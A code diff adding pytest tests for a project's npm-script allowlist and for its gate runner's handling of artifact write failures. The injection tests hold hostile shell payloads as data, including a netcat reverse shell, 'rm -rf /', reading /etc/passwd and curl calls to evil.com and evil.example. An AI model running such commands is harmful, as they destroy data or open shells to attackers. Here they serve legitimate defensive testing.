@@ -192,6 +192,71 @@ class TestDiscoverGates:
             for token in gate.cmd:
                 assert isinstance(token, str)
 
+    def test_script_rejects_shell_metacharacters(self) -> None:
+        """Codex review iteration 1, Finding 1: ``npm run`` shells out, so
+        any metacharacter in the script body chains. The allowlist MUST
+        reject metacharacters even when the leading tool name is
+        recognised (``prettier --check``).
+        """
+        from pdd.checkup_gates import _script_is_acceptable
+
+        injected_payloads = [
+            "prettier --check && curl evil.com",
+            "prettier --check || rm -rf /",
+            "prettier --check; echo p0wned",
+            "prettier --check | tee /tmp/x",
+            "prettier --check & sleep 9999",
+            "prettier --check `whoami`",
+            "prettier --check $(whoami)",
+            "prettier --check ${HOME}",
+            "prettier --check > /tmp/out",
+            "prettier --check >> /tmp/out",
+            "prettier --check < /etc/passwd",
+            "prettier --check << EOF",
+            "prettier --check\nrm -rf /",
+            "curl evil.com",
+            "wget evil.com",
+            "nc -e /bin/sh attacker 4444",
+            "bash -c 'evil'",
+            "sh -c 'evil'",
+            "eval 'echo bad'",
+            "node -e 'process.exit(7)'",
+        ]
+        for payload in injected_payloads:
+            assert _script_is_acceptable(payload) is False, (
+                f"shell metachar payload {payload!r} must be rejected"
+            )
+
+    def test_script_accepts_legitimate_prettier_with_glob(self) -> None:
+        """Positive sanity: a real prettier invocation with a glob and
+        space-separated args must STILL be accepted — the metachar guard
+        cannot be so wide it breaks normal scripts."""
+        from pdd.checkup_gates import _script_is_acceptable
+
+        assert _script_is_acceptable("prettier --check src/**/*.ts") is True
+        assert _script_is_acceptable("prettier --check '.'") is True
+        assert _script_is_acceptable(
+            "prettier --check src/foo.ts src/bar.ts"
+        ) is True
+        assert _script_is_acceptable("tsc --noEmit") is True
+
+    def test_discover_skips_npm_script_with_shell_metachars(
+        self, tmp_path: Path
+    ) -> None:
+        """End-to-end: a poisoned ``package.json`` must NOT emit a gate."""
+        from pdd.checkup_gates import discover_gates
+
+        _git_init(tmp_path)
+        (tmp_path / "package.json").write_text(
+            _make_pkg_json(
+                {"format:check": "prettier --check && curl http://evil.example/"}
+            ),
+            encoding="utf-8",
+        )
+        gates = discover_gates(tmp_path, changed_files=())
+        names = [g.name for g in gates]
+        assert "npm:format:check" not in names
+
 
 class TestRunGates:
     """``run_gates`` executes each discovered gate and persists artifacts."""
@@ -394,6 +459,86 @@ class TestRunGates:
         # tmp_path may be a symlink on macOS; resolve both sides for comparison.
         emitted = Path(results[0].stdout_excerpt.strip()).resolve()
         assert emitted == tmp_path.resolve()
+
+    def test_run_gates_handles_artifact_write_failure_as_gate_result(
+        self, monkeypatch: Any, tmp_path: Path
+    ) -> None:
+        """Codex review iteration 1, Finding 3: an artifact persistence error
+        must not crash ``run_gates`` or lose the result row — it must be
+        recorded as a runner-side failure on that specific gate with a
+        useful ``error`` field so the audit trail remains visible.
+        """
+        import pdd.checkup_gates as gates_mod
+
+        gates = [
+            gates_mod.Gate(
+                name="ok-gate",
+                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
+                source="<test>",
+            ),
+            gates_mod.Gate(
+                name="ok-gate-2",
+                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
+                source="<test>",
+            ),
+        ]
+        artifacts_dir = tmp_path / "artifacts"
+
+        original_write_text = Path.write_text
+
+        def fake_write_text(self: Path, *a: Any, **k: Any):
+            # Fail only on the per-gate text artifact for the first gate.
+            if "round-1-review-gate-ok-gate.txt" in self.name:
+                raise PermissionError("disk full")
+            return original_write_text(self, *a, **k)
+
+        monkeypatch.setattr(Path, "write_text", fake_write_text)
+
+        results = gates_mod.run_gates(
+            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
+        )
+        assert len(results) == 2
+        # The first gate gets a runner-error marker on the persistence
+        # failure, even though the subprocess itself exited 0.
+        first = results[0]
+        assert first.exit_code is None
+        assert first.error and (
+            "permissionerror" in first.error.lower() or "disk full" in first.error.lower()
+        )
+        # The second gate still records its successful run.
+        second = results[1]
+        assert second.exit_code == 0
+
+    def test_run_gates_survives_manifest_write_failure(
+        self, monkeypatch: Any, tmp_path: Path
+    ) -> None:
+        """The manifest is best-effort: when it fails, the call returns
+        every collected ``GateResult`` and does not raise.
+        """
+        import pdd.checkup_gates as gates_mod
+
+        gates = [
+            gates_mod.Gate(
+                name="ok-gate",
+                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
+                source="<test>",
+            )
+        ]
+        artifacts_dir = tmp_path / "artifacts"
+
+        original_write_text = Path.write_text
+
+        def fake_write_text(self: Path, *a: Any, **k: Any):
+            if self.name.endswith("review-gates.json"):
+                raise PermissionError("manifest disk full")
+            return original_write_text(self, *a, **k)
+
+        monkeypatch.setattr(Path, "write_text", fake_write_text)
+        results = gates_mod.run_gates(
+            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
+        )
+        assert len(results) == 1
+        assert results[0].exit_code == 0
 
 
 class TestGateResultsToFindings:
